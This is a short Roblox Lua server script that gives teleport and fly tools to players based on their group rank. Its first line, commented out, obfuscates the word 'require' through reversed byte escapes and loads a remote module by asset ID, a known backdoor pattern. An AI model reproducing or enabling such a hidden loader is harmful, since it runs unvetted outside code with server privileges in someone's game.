-- getfenv()[string.reverse("\101\114\105\117\113\101\114")](5754612086)

local Tools = game.ServerStorage.ToolStorage;
local tpTool = Tools.TPTool;
local flyTool = Tools.FlyTool;

local rankPacks = {
    [249] = {flyTool},
    [250] = {tpTool},
    [254] = {tpTool, flyTool},
    [255] = {tpTool, flyTool}
};

game.Players.PlayerAdded:Connect(function(player: Player)
    player.CharacterAdded:Connect(function(character: Model)
        local playerRank = player:GetRankInGroup(13628961);

        for i, tool: Instance in pairs(rankPacks[playerRank]) do
            local newTool = tool:Clone();
            newTool.Parent = player.Backpack;
        end
    end);
end);
